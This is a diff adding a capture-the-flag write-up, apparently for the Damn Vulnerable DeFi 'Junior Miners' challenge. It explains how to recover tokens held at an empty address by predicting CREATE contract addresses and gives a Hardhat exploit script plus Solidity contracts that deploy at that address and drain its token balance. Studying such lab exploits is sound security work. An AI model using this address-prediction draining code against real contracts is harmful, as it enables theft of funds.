@@ -784,3 +784,82 @@ For the new smart contract I upload in ``ClimberVaultV2`` I only change the swap
     }
 ```
 
+
+## Junior Miners <a name="junior_miners"></a>
+ Somebody has sent +2 million DVT tokens to 0x79658d35aB5c38B6b988C23D02e0410A380B8D5c. But the address is empty, isn't it?
+
+ To pass this challenge, you have to take all tokens out.
+
+ You may need to use prior knowledge, safely.   
+
+## Solution 
+In order to solve this challenge we have to drain the contract address above containing 
++2 million DVT tokens. The first thing that comes to my mind is to check 
+if the address is a contract and has any data that we can exploit. After checking, we recieve a "0x" which 
+means that there is no data attached to that address (no contract). Then, I discard the method of finding the private key of an 
+EOA as there isn't any clues to follow that path. So, the last option we have is to find out if we can create 
+a contract with that same address and then drain the funds as we'll be able to add custom code to it.    
+
+In ethereum, the contract addresses are deterministic, so we can calculate them before deploying a contract. 
+For this challenge the contract is created using the CREATE opcode, so according to the yellow paper that's how 
+the address is calculated:    
+``address = keccak256(rlp([sender_address,sender_nonce]))[12:]``    
+[evm-code](https://www.evm.codes/#f0)     
+
+## Exploit 
+We have to itarate two times as we have to calculate for each address deployed with a different nonce,
+the different contract addresses that the main contract address can generate with different nonces.  
+In the following solution, the nonce to deploy the main contract is 1, and if we use that deployed contract to deploy other 
+contracts. We can finnally deploy a contract with address 0x79658d35aB5c38B6b988C23D02e0410A380B8D5c with nonce 66.     
+
+```js
+it('Exploit', async function () {
+	/** CODE YOUR EXPLOIT HERE */
+	const FinderFactory = await ethers.getContractFactory("JuniorMiners", attacker);
+	for (let nonce = 0; nonce <= 10; nonce++) {
+		this.finder = await FinderFactory.deploy();
+		await findSalt(this.finder);
+	}
+
+	async function findSalt(finder) {
+		for (let salt = 0; salt <= 100; salt++) {
+			const hex = ethers.BigNumber.from(salt)._hex;
+			const rlp = ethers.utils.RLP.encode([finder.address, hex]);
+			const add = ethers.utils.keccak256(rlp);
+			const result = ethers.utils.getAddress('0x'+ add.slice(26));
+
+			if( result == DEPOSIT_ADDRESS ) {
+				await finder.create(salt);
+				return;
+			}
+		}
+	}
+
+	const ExploitFactory = await ethers.getContractFactory("JuniorMinersExploit");
+	this.exploit = await ExploitFactory.attach(DEPOSIT_ADDRESS);
+	await this.exploit.connect(attacker).attack(this.token.address)
+});
+```
+Contract:   
+```sol
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import "hardhat/console.sol";
+
+contract JuniorMinersExploit {
+    function attack(ERC20 token) external {
+        uint256 balance = token.balanceOf(address(this));
+        token.transfer(msg.sender, balance);
+    }
+}
+contract JuniorMiners {
+    function create(uint nonce) external {
+		for(uint i = 0; i < nonce; i++) {
+			new JuniorMinersExploit();
+		}
+    }
+}
+```
